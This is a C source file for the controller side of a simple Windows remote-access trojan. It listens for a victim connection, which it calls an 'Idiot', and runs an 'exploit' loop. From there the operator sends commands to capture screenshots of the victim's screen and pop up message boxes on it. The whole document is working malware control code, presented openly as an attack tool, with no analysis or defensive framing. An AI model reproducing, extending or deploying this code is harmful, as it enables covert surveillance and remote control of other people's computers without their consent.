#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <Windows.h>
#include <fstream>


#define IP "127.0.0.1"
#define PORT 2189

void ErrorHandling(char* message);
void exploit(int server, int client);

#define BUF_SIZE 30

int main()
{
	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);


	WSADATA wsaData;
	SOCKET hServSock, hClntSock;
	SOCKADDR_IN servAddr, clntAddr;

	int szClntAddr;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) ErrorHandling((char*)"WSAStartup() error");

	hServSock = socket(PF_INET, SOCK_STREAM, 0);
	if (hServSock == INVALID_SOCKET) ErrorHandling((char*)"socket() error");

	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAddr.sin_port = PORT;

	if (bind(hServSock, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) ErrorHandling((char*)"bind() error");

	if (listen(hServSock, 1) == SOCKET_ERROR) ErrorHandling((char*)"listen() error");

	SetConsoleTextAttribute(h, 4);
	printf("[+] Waiting for Idiot...\n");

	szClntAddr = sizeof(clntAddr);
	hClntSock = accept(hServSock, (SOCKADDR*)&clntAddr, &szClntAddr);
	if (hClntSock == INVALID_SOCKET) ErrorHandling((char*)"accept() error");

	SetConsoleTextAttribute(h, 6);
	printf("[+] Idiot Came in!\n");

	exploit(hServSock, hClntSock); //exploit


	closesocket(hClntSock);
	closesocket(hServSock);
	WSACleanup();
	

	return 0;
}

void exploit(int server, int client)
{
	char command[50];
	char response[50];

	while (1)
	{
		//input command
		printf("> ");
		scanf(" %[^\t\n]s", command);
		
		
		send(client, command, sizeof(command), 0);

		//!close
		if (strcmp(command, "!close") == 0)
		{
			break;
			return;
		}
		
		else if (strcmp(command, "!screenshot") == 0)
		{
			//recieve screenshot.png file from client
			FILE* fp;
			char buf[BUF_SIZE];
			int readCnt;
			fp = fopen("screenshot.bmp", "wb"); //create file
			
			while (1)
			{
				readCnt = recv(client, buf, BUF_SIZE, 0);
				
				if (strcmp(buf, "EOF") == 0) {
					break;
				}

				fwrite((void*)buf, 1, readCnt, fp);
			}

			fclose(fp);

			printf("Received screenshot.bmp file successfully.\n");
		}

		else if (strcmp(command, "!msgbox") == 0)
		{
			char title[50]; char message[50];
			printf("Message : "); scanf("%s", message);
			printf("Title : "); scanf("%s", title);
			
			//send message (arg1)
			send(client, message, sizeof(message), 0);
			//send title (arg2)
			send(client, title , sizeof(title), 0);
		}

		else
		{
			printf("> Wrong command.\n");
		}
		
		
	}

	return;
}

void ErrorHandling(char* message)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	exit(1);
}
